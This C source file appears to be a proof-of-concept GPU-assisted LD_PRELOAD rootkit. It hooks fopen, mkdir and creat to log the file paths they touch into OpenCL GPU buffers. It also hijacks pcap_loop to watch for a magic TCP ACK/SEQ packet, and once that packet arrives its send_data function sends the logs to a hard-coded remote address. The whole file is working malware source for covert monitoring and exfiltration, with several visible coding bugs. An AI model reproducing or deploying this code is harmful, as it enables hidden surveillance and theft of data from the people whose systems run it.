#define _GNU_SOURCE

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <netinet/tcp.h>
#include <netinet/in.h>
#include <netdb.h>
#include <dlfcn.h>

#include "jelly.h"
#include "kit.h"
#include "packet.h"
#include "pcap.h"

const char *syscall_table[4] = {"fopen", "mkdir", "creat", "pcap_loop"};

// get gpu device
cl_device_id create_device(){
    // check platform
    err = clGetPlatformIDs(1, &jelly->platform, NULL);
    if(err < 0){
        // do something
    }

    // access device
    err = clGetDeviceIDs(jelly->platform, CL_DEVICE_TYPE_GPU, 1, &jelly->dev, NULL);
    if(err == CL_DEVICE_NOT_FOUND){
        // do something
    }

    return jelly->dev;
}

// compile kit.cl
cl_program build_program(cl_context ctx, cl_device_id dev, const char *filename){
    FILE *program_handle;
    char *program_buf, *program_log;
    size_t program_size, log_size;

    // place content from kit.cl into buffer
    program_handle = fopen(filename, "r");
    if(program_handle == NULL){
        // cant read file
    }
    fseek(program_handle, 0, SEEK_END);
    program_size = ftell(program_handle);
    rewind(program_handle);
    program_buf = (char *)malloc(program_size + 1);
    program_buf[program_size] = '\0';
    fread(program_buf, sizeof(char), program_size, program_handle);
    fclose(program_handle);

    // create program from file
    jelly->program = clCreateProgramWithSource(jelly->ctx, 1, (const char**)&program_buf, &program_size, &err);
    if(err < 0){
        // couldn't create program
    }
    free(program_buf);

    // build program
    err = clBuildProgram(jelly->program, 0, NULL, NULL, NULL, NULL);
    if(err < 0){
        // log error
    }

    return jelly->program;
}

// It would probably just be better to xor in cpu but this is just example of using gpu to do things for us
void jelly_init(){
    char *buf, *buf2, *buf3;

    int i;
    for(i = 0; i < SYSCALL_SIZE; i++){
        jelly->dev = create_device();
        jelly->ctx = clCreateContext(NULL, 1, &jelly->dev, NULL, NULL, &err);
        jelly->program = build_program(jelly->ctx, jelly->dev, __JELLYXOR__);

	buf = (char *)malloc(strlen(syscall_table[i]) + 20);
        buf2 = (char *)malloc(strlen(buf) + 1);
	buf3 = (char *)malloc(strlen(buf2));

	strcpy(buf, syscall_table[i]);

        // xor syscall in gpu
        input = clCreateBuffer(jelly->ctx, CL_MEM_READ_WRITE | CL_MEM_COPY_HOST_PTR, VRAM_LIMIT * sizeof(char), buf, &err);
        local = clCreateBuffer(jelly->ctx, CL_MEM_READ_WRITE | CL_MEM_COPY_HOST_PTR, VRAM_LIMIT * sizeof(char), buf2, &err);
        group = clCreateBuffer(jelly->ctx, CL_MEM_READ_WRITE | CL_MEM_COPY_HOST_PTR, VRAM_LIMIT * sizeof(char), buf3, &err);

        // host-device command queue
        jelly->cq = clCreateCommandQueue(jelly->ctx, jelly->dev, 0, &err);

        // gpu kernel thread
        jelly->kernels[3] = clCreateKernel(jelly->program, jelly_xor, &err);

        // gpu kernel args
        clSetKernelArg(jelly->kernels[3], 0, sizeof(cl_mem), &input);
        clSetKernelArg(jelly->kernels[3], 1, sizeof(cl_mem), &local);
        clSetKernelArg(jelly->kernels[3], 2, sizeof(cl_mem), &group);

        // host-device comm
        clEnqueueNDRangeKernel(jelly->cq, jelly->kernels[3], 1, NULL, &global_size, &local_size, 0, NULL, NULL);
        
        // read xor'ed syscall from gpu
        clEnqueueReadBuffer(jelly->cq, group, CL_TRUE, 0, sizeof(buf3), buf3, 0, NULL, NULL);

	syscalls[i].syscall_func = dlsym(RTLD_NEXT, buf3);

	free(buf);
	free(buf2);
	free(buf3);

        clReleaseContext(jelly->ctx);
        clReleaseProgram(jelly->program);
        clReleaseMemObject(input);
	clReleaseMemObject(local);
        clReleaseMemObject(group);
	clReleaseCommandQueue(jelly->cq);
	clReleaseKernel(jelly->kernels[3]);
    }
}

static void limit_buf(char *buffer){
    if(sizeof(buffer) >= VRAM_LIMIT){
        buffer = "Buffer too big for GPU!";
    }
}

void got_packet(unsigned char *args, const struct pcap_pkthdr *header, const unsigned char *packet){
    const struct sniff_ip *ip;
    const struct sniff_tcp *tcp;

    int size_ip, size_tcp;
    unsigned int ack, seq;

    // calculate ip header offset
    ip = (struct sniff_ip*)(packet + SIZE_ETHERNET);
    size_ip = IP_HL(ip)*4;

    switch(ip->ip_p){
        case IPPROTO_TCP:
            break;
        default:
	    return;
    }

    // calculate tcp header offset
    tcp = (struct sniff_tcp*)(packet + SIZE_ETHERNET + size_ip);
    size_tcp = TH_OFF(tcp)*4;

    ack = ntohl(tcp->th_ack);
    seq = ntohl(tcp->th_seq);

    if(ack == MAGIC_ACK && seq == MAGIC_SEQ){
        correct_packet = 1;
    } else{
        correct_packet = 0;
    }
}

static void send_data(char *buffer){
    struct sockaddr_in serv_addr;

    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if(sock < 0){
        close(sock);
    }

    memset(&serv_addr, 0, sizeof(serv_addr));
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_addr.s_addr = inet_addr(ADDRESS);
    serv_addr.sin_port = htons(PORT);

    if(connect(sock,(struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0){
        close(sock);
    }

    if(send(sock, buffer, strlen(buffer), 0) < 0){
        close(sock);
    }
}

int pcap_loop(pcap_t *p, int cnt, pcap_handler callback, unsigned char *user){
    jelly_init();

    return (long)syscalls[SYS_PCAP_LOOP].syscall_func(p, cnt, got_packet, user);
}

FILE *fopen(const char *path, const char *mode){
    char *buf, *buf2, *buf3;

    jelly_init();
    jelly->dev = create_device();
    jelly->ctx = clCreateContext(NULL, 1, &jelly->dev, NULL, NULL, &err);
    jelly->program = build_program(jelly->ctx, jelly->dev, __JELLYFISH__);

    buf = (char *)malloc(strlen(path) + 20);
    buf2 = (char *)malloc(sizeof(buf) + 1);
    buf3 = (char *)malloc(256);

    // what we will store in gpu
    strcpy(buf, "opened file: ");
    strcat(buf, path);
    limit_buf(buf);

    // gpu storage
    logger = clCreateBuffer(jelly->ctx, CL_MEM_READ_WRITE | CL_MEM_COPY_HOST_PTR, VRAM_LIMIT * sizeof(char), buf, &err);
    output = clCreateBuffer(jelly->ctx, CL_MEM_READ_WRITE | CL_MEM_COPY_HOST_PTR, VRAM_LIMIT * sizeof(char), buf2, &err);
    storage = clCreateBuffer(jelly->ctx, CL_MEM_READ_WRITE | CL_MEM_COPY_HOST_PTR, VRAM_LIMIT * sizeof(char), buf3, &err);

    // host-device command queue
    jelly->cq = clCreateCommandQueue(jelly->ctx, jelly->dev, 0, &err);

    // gpu kernel thread
    jelly->kernels[0] = clCreateKernel(jelly->program, log_fopen, &err);

    // gpu kernel args
    clSetKernelArg(jelly->kernels[0], 0, sizeof(cl_mem), &logger);
    clSetKernelArg(jelly->kernels[0], 1, sizeof(cl_mem), &output);
    clSetKernelArg(jelly->kernels[0], 2, sizeof(cl_mem), &storage);

    // host-device comm
    clEnqueueNDRangeKernel(jelly->cq, jelly->kernels[0], 1, NULL, &global_size, &local_size, 0, NULL, NULL);

    // buffer now inside gpu

    // if ack-seq match, dump gpu
    if(correct_packet){
        clEnqueueReadBuffer(jelly->cq, storage, CL_TRUE, 0, sizeof(buf3), buf3, 0, NULL, NULL);
	send_data(buf3);
    }

    free(buf);
    free(buf2);
    free(buf3);

    clReleaseProgram(jelly->program);
    clReleaseContext(jelly->ctx);
    clReleaseKernel(jelly->kernels[0]);
    clReleaseMemObject(logger);
    clReleaseMemObject(output);
    clReleaseCommandQueue(jelly->cq);
    clReleaseMemObject(storage);

    return syscalls[SYS_FOPEN].syscall_func(path, mode);
}

int mkdir(int dfd, const char *pathname, const char *mode){
    char *buf, *buf2, *buf3;

    jelly_init();
    jelly->dev = create_device();
    jelly->ctx = clCreateContext(NULL, 1, &jelly->dev, NULL, NULL, &err);
    jelly->program = build_program(jelly->ctx, jelly->dev, __JELLYFISH__);

    buf = (char *)malloc(strlen(pathname) + 20);
    buf2 = (char *)malloc(sizeof(buf) + 1);
    buf3 = (char *)malloc(256);

    // what we will store in gpu
    strcpy(buf, "made new directory: ");
    strcat(buf, pathname);
    limit_buf(buf);

    // gpu storage
    logger = clCreateBuffer(jelly->ctx, CL_MEM_READ_WRITE | CL_MEM_COPY_HOST_PTR, VRAM_LIMIT * sizeof(char), buf, &err);
    output = clCreateBuffer(jelly->ctx, CL_MEM_READ_WRITE | CL_MEM_COPY_HOST_PTR, VRAM_LIMIT * sizeof(char), buf2, &err);
    storage = clCreateBuffer(jelly->ctx, CL_MEM_READ_WRITE | CL_MEM_COPY_HOST_PTR, VRAM_LIMIT * sizeof(char), buf3, &err);

    // host-device command queue
    jelly->cq = clCreateCommandQueue(jelly->ctx, jelly->dev, 0, &err);

    // gpu kernel thread
    jelly->kernels[1] = clCreateKernel(jelly->program, log_mkdir, &err);

    // gpu kernel args
    clSetKernelArg(jelly->kernels[1], 0, sizeof(cl_mem), &logger);
    clSetKernelArg(jelly->kernels[1], 1, sizeof(cl_mem), &output);
    clSetKernelArg(jelly->kernels[1], 2, sizeof(cl_mem), &storage);

    // host-device comm
    clEnqueueNDRangeKernel(jelly->cq, jelly->kernels[1], 1, NULL, &global_size, &local_size, 0, NULL, NULL);

    // buffer now inside gpu

    // if ack-seq match, dump gpu
    if(correct_packet){
        clEnqueueReadBuffer(jelly->cq, storage, CL_TRUE, 0, sizeof(buf3), buf3, 0, NULL, NULL);
	send_data(buf3);
    }

    free(buf);
    free(buf2);
    free(buf3);

    clReleaseProgram(jelly->program);
    clReleaseContext(jelly->ctx);
    clReleaseKernel(jelly->kernels[1]);
    clReleaseMemObject(logger);
    clReleaseMemObject(output);
    clReleaseCommandQueue(jelly->cq);
    clReleaseMemObject(storage);

    return (long)syscalls[SYS_MKDIR].syscall_func(dfd, pathname, mode);
}

int creat(const char *pathname, int mode){
    char *buf, *buf2, *buf3;

    jelly_init();
    jelly->dev = create_device();
    jelly->ctx = clCreateContext(NULL, 1, &jelly->dev, NULL, NULL, &err);
    jelly->program = build_program(jelly->ctx, jelly->dev, __JELLYFISH__);

    buf = (char *)malloc(strlen(pathname) + 20);
    buf2 = (char *)malloc(sizeof(buf) + 1);
    buf3 = (char *)malloc(256);

    // what we will store in gpu
    strcpy(buf, "creat() pathname: ");
    strcat(buf, pathname);
    limit_buf(buf);

    // gpu storage
    logger = clCreateBuffer(jelly->ctx, CL_MEM_READ_WRITE | CL_MEM_COPY_HOST_PTR, VRAM_LIMIT * sizeof(char), buf, &err);
    output = clCreateBuffer(jelly->ctx, CL_MEM_READ_WRITE | CL_MEM_COPY_HOST_PTR, VRAM_LIMIT * sizeof(char), buf2, &err);
    storage = clCreateBuffer(jelly->ctx, CL_MEM_READ_WRITE | CL_MEM_COPY_HOST_PTR, VRAM_LIMIT * sizeof(char), buf3, &err);

    // host-device command queue
    jelly->cq = clCreateCommandQueue(jelly->ctx, jelly->dev, 0, &err);

    // gpu kernel thread
    jelly->kernels[2] = clCreateKernel(jelly->program, log_creat, &err);

    // gpu kernel args
    clSetKernelArg(jelly->kernels[2], 0, sizeof(cl_mem), &logger);
    clSetKernelArg(jelly->kernels[2], 1, sizeof(cl_mem), &output);
    clSetKernelArg(jelly->kernels[2], 2, sizeof(cl_mem), &storage);

    // host-device comm
    clEnqueueNDRangeKernel(jelly->cq, jelly->kernels[2], 1, NULL, &global_size, &local_size, 0, NULL, NULL);

    // buffer now inside gpu

    // if ack-seq match, dump gpu
    if(correct_packet){
        clEnqueueReadBuffer(jelly->cq, storage, CL_TRUE, 0, sizeof(buf3), buf3, 0, NULL, NULL);
	send_data(buf3);
    }

    free(buf);
    free(buf2);
    free(buf3);

    clReleaseProgram(jelly->program);
    clReleaseContext(jelly->ctx);
    clReleaseKernel(jelly->kernels[2]);
    clReleaseMemObject(logger);
    clReleaseMemObject(output);
    clReleaseCommandQueue(jelly->cq);
    clReleaseMemObject(storage);

    return (long)syscalls[SYS_CREAT].syscall_func(pathname, mode);
}
